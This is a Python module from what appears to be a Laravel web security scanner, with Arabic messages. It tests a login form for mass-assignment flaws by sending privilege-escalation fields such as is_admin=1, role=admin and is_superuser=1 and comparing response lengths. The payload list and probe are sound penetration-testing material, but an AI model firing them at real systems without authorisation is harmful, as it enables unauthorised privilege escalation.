# mass-assignment.py — اختبار Mass Assignment
import urllib.parse
from core.registry import module
from core.http import req, get

@module("mass-assignment", "laravel", "اختبار Mass Assignment")
def run(base, a, R):
    login = getattr(a, "login_url", None)
    if not login:
        R.info("استخدم --login-url /login لاختبار Mass Assignment على النماذج")
        return
    tests = ["is_admin=1", "admin=1", "role=admin", "verified=1", "approved=1",
             "is_active=1", "permissions=admin", "is_superuser=1"]
    for extra in tests:
        data = "username=test&password=test123&" + extra
        st1, _, b1 = req(base + login, method="POST", data=data,
                         headers={"Content-Type": "application/x-www-form-urlencoded"})
        data2 = "username=test&password=test123"
        st2, _, b2 = req(base + login, method="POST", data=data2,
                         headers={"Content-Type": "application/x-www-form-urlencoded"})
        if len(b1) != len(b2) and st1 == st2:
            R.vuln(f"Mass Assignment محتمل: إضافة {extra} غيّرت الاستجابة ({len(b1)} vs {len(b2)} بايت)")
        else:
            R.info(f"{extra}: لا فرق ملحوظ")
